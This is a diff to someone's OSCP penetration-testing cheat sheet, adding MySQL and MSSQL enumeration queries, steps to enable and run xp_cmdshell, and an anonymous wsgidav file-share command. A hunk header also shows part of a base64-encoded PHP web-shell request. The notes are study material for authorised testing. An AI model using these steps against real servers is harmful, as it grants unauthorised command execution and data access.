@@ -101,14 +101,32 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ## XSS
 
 ## SQLi
+[Rana Kalil Video playlist](https://www.youtube.com/watch?v=X1X1UdaC_90&list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
 
 # SQL
 ## mysql
 - From kali: mysql --host <IP> -u root -proot
 	- note that there is no space between -p flag and password
 - From target: mysql -u root -p root
+### Commands
+- select system_user();
+- select version();
+- show databases;
+- SELECT * FROM \<table name> WHERE \<column>='\<field>'
 
 ## mssql
+### Commands
+- SELECT @@version;
+- SELECT name FROM sys.databases; (to list all available db's)
+	- master, tempdb, model, and msdb are default
+- SELECT * FROM \<non-default db>.information_schema.tables;
+	- select * from \<non-default db>.dbo.\<table>;
+### xp_cmdshell
+1. EXECUTE sp_configure 'show advanced options', 1;
+2. RECONFIGURE
+3. EXECUTE sp_configure 'xp_cmdshell', 1;
+4. RECONFIGURE;
+5. EXECUTE xp_cmdshell 'whoami';
 
 # SMB
 - smbclient -L \<target> -U \<user>
@@ -247,6 +265,10 @@ While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I f
 ### SSH/SCP
 scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
   
+### wsgidav
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /<directory you want to share>
+- host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 
+
 
 # Tool Syntax
 ## Crackmapexec
@@ -398,11 +420,6 @@ For the field that says "place your shellcode here," such code can be generated 
 
 ## Buffer Overflow
 As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
-
-
-
-
-
 
 
 
